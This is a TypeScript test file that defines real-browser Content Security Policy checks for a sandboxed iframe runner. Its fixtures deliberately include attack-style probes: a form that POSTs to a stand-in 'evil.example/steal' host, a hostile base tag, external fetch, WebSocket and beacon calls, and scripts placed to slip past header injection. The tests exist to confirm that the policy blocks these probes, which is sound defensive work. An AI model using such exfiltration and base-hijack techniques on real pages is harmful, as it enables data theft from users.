// REAL-BROWSER CSP SUITE TEMPLATE (F11) — EXECUTED BY THE apps/playground E2E HARNESS.
//
// jsdom cannot enforce CSP, opaque origins, or sandbox flags, so the runner's own vitest
// suite only makes string/tree assertions. THESE checks are the enforcement tests: the
// Playwright harness (child 6) must, for each entry of BROWSER_CSP_CHECKS:
//
//   1. render `<iframe sandbox="allow-scripts" srcdoc={check.html}>` inside the
//      playground page (whose HTTP CSP headers must stay compatible — srcdoc documents
//      also inherit the embedder's policy);
//   2. await a `message` whose data matches
//      `{ type: CSP_VERDICT_MESSAGE_TYPE, id: check.id }` within `check.timeoutMs`;
//   3. assert `data.pass === true` (detail carries the failure reason).
//
// Every page below is built through the production `injectCsp`, so the suite verifies
// the exact bytes the runner ships — including against hostile parse-order input.
import { injectCsp } from './csp.js';

export const CSP_VERDICT_MESSAGE_TYPE = 'snug-csp-verdict';

export interface BrowserCspCheck {
  id: string;
  description: string;
  /** Complete, CSP-injected srcdoc HTML for a sandbox="allow-scripts" iframe. */
  html: string;
  /** How long the harness should wait for the verdict (default 5000). */
  timeoutMs: number;
}

/** Wraps a check script (which must call `report(pass, detail)`) into a full app page. */
function checkPage(id: string, script: string, body = '', head = ''): string {
  const scriptOpen = '<script>';
  const scriptClose = '</' + 'script>';
  return injectCsp(
    `<!DOCTYPE html><html><head><title>${id}</title>${head}</head><body>${body}${scriptOpen}
(function () {
  var done = false;
  function report(pass, detail) {
    if (done) return;
    done = true;
    parent.postMessage({ type: '${CSP_VERDICT_MESSAGE_TYPE}', id: '${id}', pass: !!pass, detail: String(detail || '') }, '*');
  }
  window.__report = report;
  setTimeout(function () { report(false, 'check timed out inside the page'); }, 4000);
  try {
${script}
  } catch (err) {
    report(false, 'check script threw: ' + err);
  }
})();
${scriptClose}</body></html>`,
  );
}

const HOSTILE_FETCH_PROBE = [
  // Runs from a hostile position in the document; if CSP holds, fetch must reject.
  'fetch("https://example.com/").then(',
  '  function () { parent.postMessage({ type: "' + CSP_VERDICT_MESSAGE_TYPE + '", id: "__ID__", pass: false, detail: "hostile fetch resolved" }, "*"); },',
  '  function () { parent.postMessage({ type: "' + CSP_VERDICT_MESSAGE_TYPE + '", id: "__ID__", pass: true, detail: "" }, "*"); }',
  ');',
].join('\n');

function hostilePage(id: string, hostileHtml: (probe: string) => string): BrowserCspCheck {
  const scriptOpen = '<script>';
  const scriptClose = '</' + 'script>';
  const probe = `${scriptOpen}${HOSTILE_FETCH_PROBE.replaceAll('__ID__', id)}${scriptClose}`;
  return {
    id,
    description: `hostile parse-order input still gets an enforced policy: ${id}`,
    html: injectCsp(hostileHtml(probe)),
    timeoutMs: 5000,
  };
}

export const BROWSER_CSP_CHECKS: readonly BrowserCspCheck[] = [
  {
    id: 'connect-blocked',
    description: 'fetch, XHR, WebSocket, and sendBeacon are all blocked (connect-src none)',
    timeoutMs: 5000,
    html: checkPage(
      'connect-blocked',
      `
    var failures = [];
    var pending = 3;
    function settle() { if (--pending === 0) report(failures.length === 0, failures.join('; ')); }
    fetch('https://cdn.jsdelivr.net/npm/react@18/package.json').then(
      function () { failures.push('fetch resolved'); settle(); },
      function () { settle(); }
    );
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://example.com/');
      xhr.onerror = function () { settle(); };
      xhr.onload = function () { failures.push('XHR loaded'); settle(); };
      xhr.send();
    } catch (err) { settle(); }
    try {
      var ws = new WebSocket('wss://example.com/');
      ws.onerror = function () { settle(); };
      ws.onopen = function () { failures.push('WebSocket opened'); settle(); };
    } catch (err) { settle(); }
    try {
      if (navigator.sendBeacon && navigator.sendBeacon('https://example.com/', 'x')) {
        failures.push('sendBeacon accepted');
      }
    } catch (err) { /* throwing is a pass */ }
`,
    ),
  },
  {
    id: 'external-img-blocked',
    description: 'external https images never load (img-src is data:/blob: only)',
    timeoutMs: 5000,
    html: checkPage(
      'external-img-blocked',
      `
    var img = new Image();
    img.onload = function () { report(false, 'external image loaded'); };
    img.onerror = function () { report(true, ''); };
    img.src = 'https://cdn.jsdelivr.net/gh/jsdelivr/jsdelivr@main/logo.png';
`,
    ),
  },
  {
    id: 'cdn-worker-blocked',
    description: 'a Worker even from an allowlisted CDN is blocked (worker-src none, F3)',
    timeoutMs: 5000,
    html: checkPage(
      'cdn-worker-blocked',
      `
    try {
      var worker = new Worker('https://cdn.jsdelivr.net/npm/workerize@0.1.8/dist/workerize.js');
      worker.onerror = function () { report(true, ''); };
      setTimeout(function () { report(true, 'worker never signaled'); }, 1500);
      worker.postMessage('ping');
      worker.onmessage = function () { report(false, 'worker executed'); };
    } catch (err) {
      report(true, 'constructor threw: ' + err);
    }
`,
    ),
  },
  {
    id: 'storage-inaccessible',
    description: 'localStorage access throws and cookies are inert in the opaque origin',
    timeoutMs: 5000,
    html: checkPage(
      'storage-inaccessible',
      `
    var failures = [];
    try {
      window.localStorage.setItem('x', '1');
      failures.push('localStorage writable');
    } catch (err) { /* expected SecurityError */ }
    try {
      document.cookie = 'snug=1';
      if (document.cookie.indexOf('snug=1') !== -1) failures.push('cookie persisted');
    } catch (err) { /* throwing is also a pass */ }
    report(failures.length === 0, failures.join('; '));
`,
    ),
  },
  {
    id: 'nonallowlisted-cdn-blocked',
    description: 'a script from a non-allowlisted host never executes',
    timeoutMs: 5000,
    html: checkPage(
      'nonallowlisted-cdn-blocked',
      `
    var el = document.createElement('script');
    el.src = 'https://code.jquery.com/jquery-3.7.1.min.js';
    el.onload = function () { report(false, 'non-allowlisted script loaded'); };
    el.onerror = function () { report(true, ''); };
    document.body.appendChild(el);
`,
    ),
  },
  {
    id: 'allowlisted-cdn-and-eval-work',
    description: 'positive control: an allowlisted CDN script loads and eval works (unsafe-eval)',
    timeoutMs: 10000,
    html: checkPage(
      'allowlisted-cdn-and-eval-work',
      `
    var evalOk = false;
    try { evalOk = eval('1 + 2') === 3 && new Function('return 4')() === 4; } catch (err) { evalOk = false; }
    if (!evalOk) { report(false, 'eval blocked'); }
    var el = document.createElement('script');
    el.src = 'https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js';
    el.onload = function () { report(typeof window.React !== 'undefined', 'CDN script loaded but React missing'); };
    el.onerror = function () { report(false, 'allowlisted CDN script blocked'); };
    document.body.appendChild(el);
`,
    ),
  },
  {
    id: 'hostile-base-uri-ignored',
    description: "a hostile <base href> is inert (base-uri 'none') and relative fetches still fail",
    timeoutMs: 5000,
    html: checkPage(
      'hostile-base-uri-ignored',
      `
    var baseOk = document.baseURI.indexOf('https://evil.example') === -1;
    if (!baseOk) { report(false, 'baseURI followed hostile <base>: ' + document.baseURI); }
    fetch('probe.json').then(
      function () { report(false, 'relative fetch resolved'); },
      function () { report(baseOk, ''); }
    );
`,
      '',
      '<base href="https://evil.example/">',
    ),
  },
  {
    id: 'form-action-blocked',
    description: "programmatic form.submit() to an external action never navigates (form-action 'none')",
    timeoutMs: 5000,
    html: checkPage(
      'form-action-blocked',
      `
    // If the submission were allowed, the document would navigate away and NO verdict
    // would ever arrive — the harness must treat a missing verdict as a failure.
    document.addEventListener('securitypolicyviolation', function (e) {
      if (e.violatedDirective && e.violatedDirective.indexOf('form-action') === 0) report(true, '');
    });
    var form = document.createElement('form');
    form.action = 'https://evil.example/steal';
    form.method = 'POST';
    document.body.appendChild(form);
    form.submit();
    setTimeout(function () { report(true, 'still alive after submit'); }, 800);
`,
    ),
  },
  {
    id: 'permissive-app-meta-loses',
    description: 'an app shipping its own permissive CSP meta cannot widen the policy — intersection wins',
    timeoutMs: 5000,
    html: checkPage(
      'permissive-app-meta-loses',
      `
    fetch('https://example.com/').then(
      function () { report(false, 'fetch resolved despite the runner policy'); },
      function () { report(true, ''); }
    );
`,
      '',
      '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:">',
    ),
  },
  hostilePage('hostile-script-before-head', (probe) => `${probe}<head><title>x</title></head><body>x</body>`),
  hostilePage('hostile-uppercase-head', (probe) => `<HEAD>${probe}</HEAD><body>x</body>`),
  hostilePage('hostile-no-head', (probe) => `<body>${probe}</body>`),
  hostilePage('hostile-comment-decoy', (probe) => `<!-- <head> --><head>${probe}</head><body>x</body>`),
  hostilePage('hostile-body-first', (probe) => `<body>${probe}</body><head></head>`),
];
